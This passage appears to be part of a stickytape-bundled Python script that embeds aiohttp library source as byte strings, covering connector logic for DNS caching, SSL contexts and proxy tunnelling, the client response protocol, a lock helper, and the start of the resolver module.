None:\r\n            self._cached_hosts.remove((host, port))\r\n        elif host is not None or port is not None:\r\n            raise ValueError("either both host and port " "or none of them are allowed")\r\n        else:\r\n            self._cached_hosts.clear()\r\n\r\n    async def _resolve_host(\r\n        self, host: str, port: int, traces: Optional[List["Trace"]] = None\r\n    ) -> List[Dict[str, Any]]:\r\n        if is_ip_address(host):\r\n            return [\r\n                {\r\n                    "hostname": host,\r\n                    "host": host,\r\n                    "port": port,\r\n                    "family": self._family,\r\n                    "proto": 0,\r\n                    "flags": 0,\r\n                }\r\n            ]\r\n\r\n        if not self._use_dns_cache:\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_dns_resolvehost_start(host)\r\n\r\n            res = await self._resolver.resolve(host, port, family=self._family)\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_dns_resolvehost_end(host)\r\n\r\n            return res\r\n\r\n        key = (host, port)\r\n\r\n        if (key in self._cached_hosts) and (not self._cached_hosts.expired(key)):\r\n            # get result early, before any await (#4014)\r\n            result = self._cached_hosts.next_addrs(key)\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_dns_cache_hit(host)\r\n            return result\r\n\r\n        if key in self._throttle_dns_events:\r\n            # get event early, before any await (#4014)\r\n            event = self._throttle_dns_events[key]\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_dns_cache_hit(host)\r\n            await event.wait()\r\n        else:\r\n            # update dict early, before any await (#4014)\r\n            self._throttle_dns_events[key] = EventResultOrError(self._loop)\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_dns_cache_miss(host)\r\n            try:\r\n\r\n                if traces:\r\n                    for trace in traces:\r\n                        await trace.send_dns_resolvehost_start(host)\r\n\r\n                addrs = await self._resolver.resolve(host, port, family=self._family)\r\n                if traces:\r\n                    for trace in traces:\r\n                        await trace.send_dns_resolvehost_end(host)\r\n\r\n                self._cached_hosts.add(key, addrs)\r\n                self._throttle_dns_events[key].set()\r\n            except BaseException as e:\r\n                # any DNS exception, independently of the implementation\r\n                # is set for the waiters to raise the same exception.\r\n                self._throttle_dns_events[key].set(exc=e)\r\n                raise\r\n            finally:\r\n                self._throttle_dns_events.pop(key)\r\n\r\n        return self._cached_hosts.next_addrs(key)\r\n\r\n    async def _create_connection(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> ResponseHandler:\r\n        """Create connection.\r\n\r\n        Has same keyword arguments as BaseEventLoop.create_connection.\r\n        """\r\n        if req.proxy:\r\n            _, proto = await self._create_proxy_connection(req, traces, timeout)\r\n        else:\r\n            _, proto = await self._create_direct_connection(req, traces, timeout)\r\n\r\n        return proto\r\n\r\n    @staticmethod\r\n    @functools.lru_cache(None)\r\n    def _make_ssl_context(verified: bool) -> SSLContext:\r\n        if verified:\r\n            return ssl.create_default_context()\r\n        else:\r\n            sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\r\n            sslcontext.options |= ssl.OP_NO_SSLv2\r\n            sslcontext.options |= ssl.OP_NO_SSLv3\r\n            sslcontext.check_hostname = False\r\n            sslcontext.verify_mode = ssl.CERT_NONE\r\n            try:\r\n                sslcontext.options |= ssl.OP_NO_COMPRESSION\r\n            except AttributeError as attr_err:\r\n                warnings.warn(\r\n                    "{!s}: The Python interpreter is compiled "\r\n                    "against OpenSSL < 1.0.0. Ref: "\r\n                    "https://docs.python.org/3/library/ssl.html"\r\n                    "#ssl.OP_NO_COMPRESSION".format(attr_err),\r\n                )\r\n            sslcontext.set_default_verify_paths()\r\n            return sslcontext\r\n\r\n    def _get_ssl_context(self, req: "ClientRequest") -> Optional[SSLContext]:\r\n        """Logic to get the correct SSL context\r\n\r\n        0. if req.ssl is false, return None\r\n\r\n        1. if ssl_context is specified in req, use it\r\n        2. if _ssl_context is specified in self, use it\r\n        3. otherwise:\r\n            1. if verify_ssl is not specified in req, use self.ssl_context\r\n               (will generate a default context according to self.verify_ssl)\r\n            2. if verify_ssl is True in req, generate a default SSL context\r\n            3. if verify_ssl is False in req, generate a SSL context that\r\n               won\'t verify\r\n        """\r\n        if req.is_ssl():\r\n            if ssl is None:  # pragma: no cover\r\n                raise RuntimeError("SSL is not supported.")\r\n            sslcontext = req.ssl\r\n            if isinstance(sslcontext, ssl.SSLContext):\r\n                return sslcontext\r\n            if sslcontext is not None:\r\n                # not verified or fingerprinted\r\n                return self._make_ssl_context(False)\r\n            sslcontext = self._ssl\r\n            if isinstance(sslcontext, ssl.SSLContext):\r\n                return sslcontext\r\n            if sslcontext is not None:\r\n                # not verified or fingerprinted\r\n                return self._make_ssl_context(False)\r\n            return self._make_ssl_context(True)\r\n        else:\r\n            return None\r\n\r\n    def _get_fingerprint(self, req: "ClientRequest") -> Optional["Fingerprint"]:\r\n        ret = req.ssl\r\n        if isinstance(ret, Fingerprint):\r\n            return ret\r\n        ret = self._ssl\r\n        if isinstance(ret, Fingerprint):\r\n            return ret\r\n        return None\r\n\r\n    async def _wrap_create_connection(\r\n        self,\r\n        *args: Any,\r\n        req: "ClientRequest",\r\n        timeout: "ClientTimeout",\r\n        client_error: Type[Exception] = ClientConnectorError,\r\n        **kwargs: Any,\r\n    ) -> Tuple[asyncio.Transport, ResponseHandler]:\r\n        try:\r\n            async with ceil_timeout(timeout.sock_connect):\r\n                return await self._loop.create_connection(*args, **kwargs)  # type: ignore[return-value]  # noqa\r\n        except cert_errors as exc:\r\n            raise ClientConnectorCertificateError(req.connection_key, exc) from exc\r\n        except ssl_errors as exc:\r\n            raise ClientConnectorSSLError(req.connection_key, exc) from exc\r\n        except OSError as exc:\r\n            raise client_error(req.connection_key, exc) from exc\r\n\r\n    def _fail_on_no_start_tls(self, req: "ClientRequest") -> None:\r\n        """Raise a :py:exc:`RuntimeError` on missing ``start_tls()``.\r\n\r\n        One case is that :py:meth:`asyncio.loop.start_tls` is not yet\r\n        implemented under Python 3.6. It is necessary for TLS-in-TLS so\r\n        that it is possible to send HTTPS queries through HTTPS proxies.\r\n\r\n        This doesn\'t affect regular HTTP requests, though.\r\n        """\r\n        if not req.is_ssl():\r\n            return\r\n\r\n        proxy_url = req.proxy\r\n        assert proxy_url is not None\r\n        if proxy_url.scheme != "https":\r\n            return\r\n\r\n        self._check_loop_for_start_tls()\r\n\r\n    def _check_loop_for_start_tls(self) -> None:\r\n        try:\r\n            self._loop.start_tls\r\n        except AttributeError as attr_exc:\r\n            raise RuntimeError(\r\n                "An HTTPS request is being sent through an HTTPS proxy. "\r\n                "This needs support for TLS in TLS but it is not implemented "\r\n                "in your runtime for the stdlib asyncio.\\n\\n"\r\n                "Please upgrade to Python 3.7 or higher. For more details, "\r\n                "please see:\\n"\r\n                "* https://bugs.python.org/issue37179\\n"\r\n                "* https://github.com/python/cpython/pull/28073\\n"\r\n                "* https://docs.aiohttp.org/en/stable/"\r\n                "client_advanced.html#proxy-support\\n"\r\n                "* https://github.com/aio-libs/aiohttp/discussions/6044\\n",\r\n            ) from attr_exc\r\n\r\n    def _loop_supports_start_tls(self) -> bool:\r\n        try:\r\n            self._check_loop_for_start_tls()\r\n        except RuntimeError:\r\n            return False\r\n        else:\r\n            return True\r\n\r\n    def _warn_about_tls_in_tls(\r\n        self,\r\n        underlying_transport: asyncio.Transport,\r\n        req: "ClientRequest",\r\n    ) -> None:\r\n        """Issue a warning if the requested URL has HTTPS scheme."""\r\n        if req.request_info.url.scheme != "https":\r\n            return\r\n\r\n        asyncio_supports_tls_in_tls = getattr(\r\n            underlying_transport,\r\n            "_start_tls_compatible",\r\n            False,\r\n        )\r\n\r\n        if asyncio_supports_tls_in_tls:\r\n            return\r\n\r\n        warnings.warn(\r\n            "An HTTPS request is being sent through an HTTPS proxy. "\r\n            "This support for TLS in TLS is known to be disabled "\r\n            "in the stdlib asyncio. This is why you\'ll probably see "\r\n            "an error in the log below.\\n\\n"\r\n            "It is possible to enable it via monkeypatching under "\r\n            "Python 3.7 or higher. For more details, see:\\n"\r\n            "* https://bugs.python.org/issue37179\\n"\r\n            "* https://github.com/python/cpython/pull/28073\\n\\n"\r\n            "You can temporarily patch this as follows:\\n"\r\n            "* https://docs.aiohttp.org/en/stable/client_advanced.html#proxy-support\\n"\r\n            "* https://github.com/aio-libs/aiohttp/discussions/6044\\n",\r\n            RuntimeWarning,\r\n            source=self,\r\n            # Why `4`? At least 3 of the calls in the stack originate\r\n            # from the methods in this class.\r\n            stacklevel=3,\r\n        )\r\n\r\n    async def _start_tls_connection(\r\n        self,\r\n        underlying_transport: asyncio.Transport,\r\n        req: "ClientRequest",\r\n        timeout: "ClientTimeout",\r\n        client_error: Type[Exception] = ClientConnectorError,\r\n    ) -> Tuple[asyncio.BaseTransport, ResponseHandler]:\r\n        """Wrap the raw TCP transport with TLS."""\r\n        tls_proto = self._factory()  # Create a brand new proto for TLS\r\n\r\n        # Safety of the `cast()` call here is based on the fact that\r\n        # internally `_get_ssl_context()` only returns `None` when\r\n        # `req.is_ssl()` evaluates to `False` which is never gonna happen\r\n        # in this code path. Of course, it\'s rather fragile\r\n        # maintainability-wise but this is to be solved separately.\r\n        sslcontext = cast(ssl.SSLContext, self._get_ssl_context(req))\r\n\r\n        try:\r\n            async with ceil_timeout(timeout.sock_connect):\r\n                try:\r\n                    tls_transport = await self._loop.start_tls(\r\n                        underlying_transport,\r\n                        tls_proto,\r\n                        sslcontext,\r\n                        server_hostname=req.host,\r\n                        ssl_handshake_timeout=timeout.total,\r\n                    )\r\n                except BaseException:\r\n                    # We need to close the underlying transport since\r\n                    # `start_tls()` probably failed before it had a\r\n                    # chance to do this:\r\n                    underlying_transport.close()\r\n                    raise\r\n        except cert_errors as exc:\r\n            raise ClientConnectorCertificateError(req.connection_key, exc) from exc\r\n        except ssl_errors as exc:\r\n            raise ClientConnectorSSLError(req.connection_key, exc) from exc\r\n        except OSError as exc:\r\n            raise client_error(req.connection_key, exc) from exc\r\n        except TypeError as type_err:\r\n            # Example cause looks like this:\r\n            # TypeError: transport <asyncio.sslproto._SSLProtocolTransport\r\n            # object at 0x7f760615e460> is not supported by start_tls()\r\n\r\n            raise ClientConnectionError(\r\n                "Cannot initialize a TLS-in-TLS connection to host "\r\n                f"{req.host!s}:{req.port:d} through an underlying connection "\r\n                f"to an HTTPS proxy {req.proxy!s} ssl:{req.ssl or \'default\'} "\r\n                f"[{type_err!s}]"\r\n            ) from type_err\r\n        else:\r\n            tls_proto.connection_made(\r\n                tls_transport\r\n            )  # Kick the state machine of the new TLS protocol\r\n\r\n        return tls_transport, tls_proto\r\n\r\n    async def _create_direct_connection(\r\n        self,\r\n        req: "ClientRequest",\r\n        traces: List["Trace"],\r\n        timeout: "ClientTimeout",\r\n        *,\r\n        client_error: Type[Exception] = ClientConnectorError,\r\n    ) -> Tuple[asyncio.Transport, ResponseHandler]:\r\n        sslcontext = self._get_ssl_context(req)\r\n        fingerprint = self._get_fingerprint(req)\r\n\r\n        host = req.url.raw_host\r\n        assert host is not None\r\n        port = req.port\r\n        assert port is not None\r\n        host_resolved = asyncio.ensure_future(\r\n            self._resolve_host(host, port, traces=traces), loop=self._loop\r\n        )\r\n        try:\r\n            # Cancelling this lookup should not cancel the underlying lookup\r\n            #  or else the cancel event will get broadcast to all the waiters\r\n            #  across all connections.\r\n            hosts = await asyncio.shield(host_resolved)\r\n        except asyncio.CancelledError:\r\n\r\n            def drop_exception(fut: "asyncio.Future[List[Dict[str, Any]]]") -> None:\r\n                with suppress(Exception, asyncio.CancelledError):\r\n                    fut.result()\r\n\r\n            host_resolved.add_done_callback(drop_exception)\r\n            raise\r\n        except OSError as exc:\r\n            # in case of proxy it is not ClientProxyConnectionError\r\n            # it is problem of resolving proxy ip itself\r\n            raise ClientConnectorError(req.connection_key, exc) from exc\r\n\r\n        last_exc = None  # type: Optional[Exception]\r\n\r\n        for hinfo in hosts:\r\n            host = hinfo["host"]\r\n            port = hinfo["port"]\r\n\r\n            try:\r\n                transp, proto = await self._wrap_create_connection(\r\n                    self._factory,\r\n                    host,\r\n                    port,\r\n                    timeout=timeout,\r\n                    ssl=sslcontext,\r\n                    family=hinfo["family"],\r\n                    proto=hinfo["proto"],\r\n                    flags=hinfo["flags"],\r\n                    server_hostname=hinfo["hostname"] if sslcontext else None,\r\n                    local_addr=self._local_addr,\r\n                    req=req,\r\n                    client_error=client_error,\r\n                )\r\n            except ClientConnectorError as exc:\r\n                last_exc = exc\r\n                continue\r\n\r\n            if req.is_ssl() and fingerprint:\r\n                try:\r\n                    fingerprint.check(transp)\r\n                except ServerFingerprintMismatch as exc:\r\n                    transp.close()\r\n                    if not self._cleanup_closed_disabled:\r\n                        self._cleanup_closed_transports.append(transp)\r\n                    last_exc = exc\r\n                    continue\r\n\r\n            return transp, proto\r\n        else:\r\n            assert last_exc is not None\r\n            raise last_exc\r\n\r\n    async def _create_proxy_connection(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> Tuple[asyncio.BaseTransport, ResponseHandler]:\r\n        self._fail_on_no_start_tls(req)\r\n        runtime_has_start_tls = self._loop_supports_start_tls()\r\n\r\n        headers = {}  # type: Dict[str, str]\r\n        if req.proxy_headers is not None:\r\n            headers = req.proxy_headers  # type: ignore[assignment]\r\n        headers[hdrs.HOST] = req.headers[hdrs.HOST]\r\n\r\n        url = req.proxy\r\n        assert url is not None\r\n        proxy_req = ClientRequest(\r\n            hdrs.METH_GET,\r\n            url,\r\n            headers=headers,\r\n            auth=req.proxy_auth,\r\n            loop=self._loop,\r\n            ssl=req.ssl,\r\n        )\r\n\r\n        # create connection to proxy server\r\n        transport, proto = await self._create_direct_connection(\r\n            proxy_req, [], timeout, client_error=ClientProxyConnectionError\r\n        )\r\n\r\n        # Many HTTP proxies has buggy keepalive support.  Let\'s not\r\n        # reuse connection but close it after processing every\r\n        # response.\r\n        proto.force_close()\r\n\r\n        auth = proxy_req.headers.pop(hdrs.AUTHORIZATION, None)\r\n        if auth is not None:\r\n            if not req.is_ssl():\r\n                req.headers[hdrs.PROXY_AUTHORIZATION] = auth\r\n            else:\r\n                proxy_req.headers[hdrs.PROXY_AUTHORIZATION] = auth\r\n\r\n        if req.is_ssl():\r\n            if runtime_has_start_tls:\r\n                self._warn_about_tls_in_tls(transport, req)\r\n\r\n            # For HTTPS requests over HTTP proxy\r\n            # we must notify proxy to tunnel connection\r\n            # so we send CONNECT command:\r\n            #   CONNECT www.python.org:443 HTTP/1.1\r\n            #   Host: www.python.org\r\n            #\r\n            # next we must do TLS handshake and so on\r\n            # to do this we must wrap raw socket into secure one\r\n            # asyncio handles this perfectly\r\n            proxy_req.method = hdrs.METH_CONNECT\r\n            proxy_req.url = req.url\r\n            key = attr.evolve(\r\n                req.connection_key, proxy=None, proxy_auth=None, proxy_headers_hash=None\r\n            )\r\n            conn = Connection(self, key, proto, self._loop)\r\n            proxy_resp = await proxy_req.send(conn)\r\n            try:\r\n                protocol = conn._protocol\r\n                assert protocol is not None\r\n\r\n                # read_until_eof=True will ensure the connection isn\'t closed\r\n                # once the response is received and processed allowing\r\n                # START_TLS to work on the connection below.\r\n                protocol.set_response_params(read_until_eof=runtime_has_start_tls)\r\n                resp = await proxy_resp.start(conn)\r\n            except BaseException:\r\n                proxy_resp.close()\r\n                conn.close()\r\n                raise\r\n            else:\r\n                conn._protocol = None\r\n                conn._transport = None\r\n                try:\r\n                    if resp.status != 200:\r\n                        message = resp.reason\r\n                        if message is None:\r\n                            message = RESPONSES[resp.status][0]\r\n                        raise ClientHttpProxyError(\r\n                            proxy_resp.request_info,\r\n                            resp.history,\r\n                            status=resp.status,\r\n                            message=message,\r\n                            headers=resp.headers,\r\n                        )\r\n                    if not runtime_has_start_tls:\r\n                        rawsock = transport.get_extra_info("socket", default=None)\r\n                        if rawsock is None:\r\n                            raise RuntimeError(\r\n                                "Transport does not expose socket instance"\r\n                            )\r\n                        # Duplicate the socket, so now we can close proxy transport\r\n                        rawsock = rawsock.dup()\r\n                except BaseException:\r\n                    # It shouldn\'t be closed in `finally` because it\'s fed to\r\n                    # `loop.start_tls()` and the docs say not to touch it after\r\n                    # passing there.\r\n                    transport.close()\r\n                    raise\r\n                finally:\r\n                    if not runtime_has_start_tls:\r\n                        transport.close()\r\n\r\n                if not runtime_has_start_tls:\r\n                    # HTTP proxy with support for upgrade to HTTPS\r\n                    sslcontext = self._get_ssl_context(req)\r\n                    return await self._wrap_create_connection(\r\n                        self._factory,\r\n                        timeout=timeout,\r\n                        ssl=sslcontext,\r\n                        sock=rawsock,\r\n                        server_hostname=req.host,\r\n                        req=req,\r\n                    )\r\n\r\n                return await self._start_tls_connection(\r\n                    # Access the old transport for the last time before it\'s\r\n                    # closed and forgotten forever:\r\n                    transport,\r\n                    req=req,\r\n                    timeout=timeout,\r\n                )\r\n            finally:\r\n                proxy_resp.close()\r\n\r\n        return transport, proto\r\n\r\n\r\nclass UnixConnector(BaseConnector):\r\n    """Unix socket connector.\r\n\r\n    path - Unix socket path.\r\n    keepalive_timeout - (optional) Keep-alive timeout.\r\n    force_close - Set to True to force close and do reconnect\r\n        after each request (and between redirects).\r\n    limit - The total number of simultaneous connections.\r\n    limit_per_host - Number of simultaneous connections to one host.\r\n    loop - Optional event loop.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        path: str,\r\n        force_close: bool = False,\r\n        keepalive_timeout: Union[object, float, None] = sentinel,\r\n        limit: int = 100,\r\n        limit_per_host: int = 0,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> None:\r\n        super().__init__(\r\n            force_close=force_close,\r\n            keepalive_timeout=keepalive_timeout,\r\n            limit=limit,\r\n            limit_per_host=limit_per_host,\r\n            loop=loop,\r\n        )\r\n        self._path = path\r\n\r\n    @property\r\n    def path(self) -> str:\r\n        """Path to unix socket."""\r\n        return self._path\r\n\r\n    async def _create_connection(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> ResponseHandler:\r\n        try:\r\n            async with ceil_timeout(timeout.sock_connect):\r\n                _, proto = await self._loop.create_unix_connection(\r\n                    self._factory, self._path\r\n                )\r\n        except OSError as exc:\r\n            raise UnixClientConnectorError(self.path, req.connection_key, exc) from exc\r\n\r\n        return cast(ResponseHandler, proto)\r\n\r\n\r\nclass NamedPipeConnector(BaseConnector):\r\n    """Named pipe connector.\r\n\r\n    Only supported by the proactor event loop.\r\n    See also: https://docs.python.org/3.7/library/asyncio-eventloop.html\r\n\r\n    path - Windows named pipe path.\r\n    keepalive_timeout - (optional) Keep-alive timeout.\r\n    force_close - Set to True to force close and do reconnect\r\n        after each request (and between redirects).\r\n    limit - The total number of simultaneous connections.\r\n    limit_per_host - Number of simultaneous connections to one host.\r\n    loop - Optional event loop.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        path: str,\r\n        force_close: bool = False,\r\n        keepalive_timeout: Union[object, float, None] = sentinel,\r\n        limit: int = 100,\r\n        limit_per_host: int = 0,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> None:\r\n        super().__init__(\r\n            force_close=force_close,\r\n            keepalive_timeout=keepalive_timeout,\r\n            limit=limit,\r\n            limit_per_host=limit_per_host,\r\n            loop=loop,\r\n        )\r\n        if not isinstance(\r\n            self._loop, asyncio.ProactorEventLoop  # type: ignore[attr-defined]\r\n        ):\r\n            raise RuntimeError(\r\n                "Named Pipes only available in proactor " "loop under windows"\r\n            )\r\n        self._path = path\r\n\r\n    @property\r\n    def path(self) -> str:\r\n        """Path to the named pipe."""\r\n        return self._path\r\n\r\n    async def _create_connection(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> ResponseHandler:\r\n        try:\r\n            async with ceil_timeout(timeout.sock_connect):\r\n                _, proto = await self._loop.create_pipe_connection(  # type: ignore[attr-defined] # noqa: E501\r\n                    self._factory, self._path\r\n                )\r\n                # the drain is required so that the connection_made is called\r\n                # and transport is set otherwise it is not set before the\r\n                # `assert conn.transport is not None`\r\n                # in client.py\'s _request method\r\n                await asyncio.sleep(0)\r\n                # other option is to manually set transport like\r\n                # `proto.transport = trans`\r\n        except OSError as exc:\r\n            raise ClientConnectorError(req.connection_key, exc) from exc\r\n\r\n        return cast(ResponseHandler, proto)\r\n')
    __stickytape_write_module('aiohttp/client_proto.py', b'import asyncio\r\nfrom contextlib import suppress\r\nfrom typing import Any, Optional, Tuple\r\n\r\nfrom .base_protocol import BaseProtocol\r\nfrom .client_exceptions import (\r\n    ClientOSError,\r\n    ClientPayloadError,\r\n    ServerDisconnectedError,\r\n    ServerTimeoutError,\r\n)\r\nfrom .helpers import BaseTimerContext\r\nfrom .http import HttpResponseParser, RawResponseMessage\r\nfrom .streams import EMPTY_PAYLOAD, DataQueue, StreamReader\r\n\r\n\r\nclass ResponseHandler(BaseProtocol, DataQueue[Tuple[RawResponseMessage, StreamReader]]):\r\n    """Helper class to adapt between Protocol and StreamReader."""\r\n\r\n    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:\r\n        BaseProtocol.__init__(self, loop=loop)\r\n        DataQueue.__init__(self, loop)\r\n\r\n        self._should_close = False\r\n\r\n        self._payload: Optional[StreamReader] = None\r\n        self._skip_payload = False\r\n        self._payload_parser = None\r\n\r\n        self._timer = None\r\n\r\n        self._tail = b""\r\n        self._upgraded = False\r\n        self._parser = None  # type: Optional[HttpResponseParser]\r\n\r\n        self._read_timeout = None  # type: Optional[float]\r\n        self._read_timeout_handle = None  # type: Optional[asyncio.TimerHandle]\r\n\r\n    @property\r\n    def upgraded(self) -> bool:\r\n        return self._upgraded\r\n\r\n    @property\r\n    def should_close(self) -> bool:\r\n        if self._payload is not None and not self._payload.is_eof() or self._upgraded:\r\n            return True\r\n\r\n        return (\r\n            self._should_close\r\n            or self._upgraded\r\n            or self.exception() is not None\r\n            or self._payload_parser is not None\r\n            or len(self) > 0\r\n            or bool(self._tail)\r\n        )\r\n\r\n    def force_close(self) -> None:\r\n        self._should_close = True\r\n\r\n    def close(self) -> None:\r\n        transport = self.transport\r\n        if transport is not None:\r\n            transport.close()\r\n            self.transport = None\r\n            self._payload = None\r\n            self._drop_timeout()\r\n\r\n    def is_connected(self) -> bool:\r\n        return self.transport is not None and not self.transport.is_closing()\r\n\r\n    def connection_lost(self, exc: Optional[BaseException]) -> None:\r\n        self._drop_timeout()\r\n\r\n        if self._payload_parser is not None:\r\n            with suppress(Exception):\r\n                self._payload_parser.feed_eof()\r\n\r\n        uncompleted = None\r\n        if self._parser is not None:\r\n            try:\r\n                uncompleted = self._parser.feed_eof()\r\n            except Exception:\r\n                if self._payload is not None:\r\n                    self._payload.set_exception(\r\n                        ClientPayloadError("Response payload is not completed")\r\n                    )\r\n\r\n        if not self.is_eof():\r\n            if isinstance(exc, OSError):\r\n                exc = ClientOSError(*exc.args)\r\n            if exc is None:\r\n                exc = ServerDisconnectedError(uncompleted)\r\n            # assigns self._should_close to True as side effect,\r\n            # we do it anyway below\r\n            self.set_exception(exc)\r\n\r\n        self._should_close = True\r\n        self._parser = None\r\n        self._payload = None\r\n        self._payload_parser = None\r\n        self._reading_paused = False\r\n\r\n        super().connection_lost(exc)\r\n\r\n    def eof_received(self) -> None:\r\n        # should call parser.feed_eof() most likely\r\n        self._drop_timeout()\r\n\r\n    def pause_reading(self) -> None:\r\n        super().pause_reading()\r\n        self._drop_timeout()\r\n\r\n    def resume_reading(self) -> None:\r\n        super().resume_reading()\r\n        self._reschedule_timeout()\r\n\r\n    def set_exception(self, exc: BaseException) -> None:\r\n        self._should_close = True\r\n        self._drop_timeout()\r\n        super().set_exception(exc)\r\n\r\n    def set_parser(self, parser: Any, payload: Any) -> None:\r\n        # TODO: actual types are:\r\n        #   parser: WebSocketReader\r\n        #   payload: FlowControlDataQueue\r\n        # but they are not generi enough\r\n        # Need an ABC for both types\r\n        self._payload = payload\r\n        self._payload_parser = parser\r\n\r\n        self._drop_timeout()\r\n\r\n        if self._tail:\r\n            data, self._tail = self._tail, b""\r\n            self.data_received(data)\r\n\r\n    def set_response_params(\r\n        self,\r\n        *,\r\n        timer: Optional[BaseTimerContext] = None,\r\n        skip_payload: bool = False,\r\n        read_until_eof: bool = False,\r\n        auto_decompress: bool = True,\r\n        read_timeout: Optional[float] = None,\r\n        read_bufsize: int = 2 ** 16,\r\n    ) -> None:\r\n        self._skip_payload = skip_payload\r\n\r\n        self._read_timeout = read_timeout\r\n        self._reschedule_timeout()\r\n\r\n        self._parser = HttpResponseParser(\r\n            self,\r\n            self._loop,\r\n            read_bufsize,\r\n            timer=timer,\r\n            payload_exception=ClientPayloadError,\r\n            response_with_body=not skip_payload,\r\n            read_until_eof=read_until_eof,\r\n            auto_decompress=auto_decompress,\r\n        )\r\n\r\n        if self._tail:\r\n            data, self._tail = self._tail, b""\r\n            self.data_received(data)\r\n\r\n    def _drop_timeout(self) -> None:\r\n        if self._read_timeout_handle is not None:\r\n            self._read_timeout_handle.cancel()\r\n            self._read_timeout_handle = None\r\n\r\n    def _reschedule_timeout(self) -> None:\r\n        timeout = self._read_timeout\r\n        if self._read_timeout_handle is not None:\r\n            self._read_timeout_handle.cancel()\r\n\r\n        if timeout:\r\n            self._read_timeout_handle = self._loop.call_later(\r\n                timeout, self._on_read_timeout\r\n            )\r\n        else:\r\n            self._read_timeout_handle = None\r\n\r\n    def _on_read_timeout(self) -> None:\r\n        exc = ServerTimeoutError("Timeout on reading data from socket")\r\n        self.set_exception(exc)\r\n        if self._payload is not None:\r\n            self._payload.set_exception(exc)\r\n\r\n    def data_received(self, data: bytes) -> None:\r\n        self._reschedule_timeout()\r\n\r\n        if not data:\r\n            return\r\n\r\n        # custom payload parser\r\n        if self._payload_parser is not None:\r\n            eof, tail = self._payload_parser.feed_data(data)\r\n            if eof:\r\n                self._payload = None\r\n                self._payload_parser = None\r\n\r\n                if tail:\r\n                    self.data_received(tail)\r\n            return\r\n        else:\r\n            if self._upgraded or self._parser is None:\r\n                # i.e. websocket connection, websocket parser is not set yet\r\n                self._tail += data\r\n            else:\r\n                # parse http messages\r\n                try:\r\n                    messages, upgraded, tail = self._parser.feed_data(data)\r\n                except BaseException as exc:\r\n                    if self.transport is not None:\r\n                        # connection.release() could be called BEFORE\r\n                        # data_received(), the transport is already\r\n                        # closed in this case\r\n                        self.transport.close()\r\n                    # should_close is True after the call\r\n                    self.set_exception(exc)\r\n                    return\r\n\r\n                self._upgraded = upgraded\r\n\r\n                payload: Optional[StreamReader] = None\r\n                for message, payload in messages:\r\n                    if message.should_close:\r\n                        self._should_close = True\r\n\r\n                    self._payload = payload\r\n\r\n                    if self._skip_payload or message.code in (204, 304):\r\n                        self.feed_data((message, EMPTY_PAYLOAD), 0)\r\n                    else:\r\n                        self.feed_data((message, payload), 0)\r\n                if payload is not None:\r\n                    # new message(s) was processed\r\n                    # register timeout handler unsubscribing\r\n                    # either on end-of-stream or immediately for\r\n                    # EMPTY_PAYLOAD\r\n                    if payload is not EMPTY_PAYLOAD:\r\n                        payload.on_eof(self._drop_timeout)\r\n                    else:\r\n                        self._drop_timeout()\r\n\r\n                if tail:\r\n                    if upgraded:\r\n                        self.data_received(tail)\r\n                    else:\r\n                        self._tail = tail\r\n')
    __stickytape_write_module('aiohttp/locks.py', b'import asyncio\r\nimport collections\r\nfrom typing import Any, Deque, Optional\r\n\r\n\r\nclass EventResultOrError:\r\n    """Event asyncio lock helper class.\r\n\r\n    Wraps the Event asyncio lock allowing either to awake the\r\n    locked Tasks without any error or raising an exception.\r\n\r\n    thanks to @vorpalsmith for the simple design.\r\n    """\r\n\r\n    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:\r\n        self._loop = loop\r\n        self._exc = None  # type: Optional[BaseException]\r\n        self._event = asyncio.Event()\r\n        self._waiters = collections.deque()  # type: Deque[asyncio.Future[Any]]\r\n\r\n    def set(self, exc: Optional[BaseException] = None) -> None:\r\n        self._exc = exc\r\n        self._event.set()\r\n\r\n    async def wait(self) -> Any:\r\n        waiter = self._loop.create_task(self._event.wait())\r\n        self._waiters.append(waiter)\r\n        try:\r\n            val = await waiter\r\n        finally:\r\n            self._waiters.remove(waiter)\r\n\r\n        if self._exc is not None:\r\n            raise self._exc\r\n\r\n        return val\r\n\r\n    def cancel(self) -> None:\r\n        """Cancel all waiters"""\r\n        for waiter in self._waiters:\r\n            waiter.cancel()\r\n')
    __stickytape_write_module('aiohttp/resolver.py', b'import asyncio\r\nimport socket\r\nfrom typing import Any, Dict, List, Optional, Type, Union\r\n\r\nfrom .abc import AbstractResolver\r\nfrom .helpers import get_running_loop\r\n\r\n__all__ = ("ThreadedResolver", "AsyncResolver", "DefaultResolver")\r\n\r\ntry:\r\n    import aiodns\r\n\r\n    # aiodns_default = hasattr(aiodns.DNSResolver, \'gethostbyname\')\r\nexcept ImportError:  # pragma: no cover\r\n    aiodns = None\r\n\r\naiodns_default = False\r\n\r\n\r\nclass ThreadedResolver(AbstractResolver):\r\n    """Threaded resolver.\r\n\r\n    Uses an Executor for synchronous getaddrinfo() calls.\r\n    concurrent.futures.ThreadPoolExecutor is used by default.\r\n    """\r\n\r\n    def __init__(self, loop: Optional[asyncio.AbstractEventLoop] = None) -> None:\r\n        self._loop = get_running_loop(loop)\r\n\r\n    async def resolve(\r\n        self, hostname: str, port: int = 0, family: int = socket.AF_INET\r\n    ) -> List[Dict[str, Any]]:\r\n        infos = await self._loop.getaddrinfo(\r\n            hostname,\r\n            port,\r\n            type=socket.SOCK_STREAM,\r\n            family=family,\r\n            flags=socket.AI_ADDRCONFIG,\r\n        )\r\n\r\n        hosts = []\r\n        for family, _, proto, _, address in infos:\r\n            if family == socket.AF_INET6:\r\n                if len(address) < 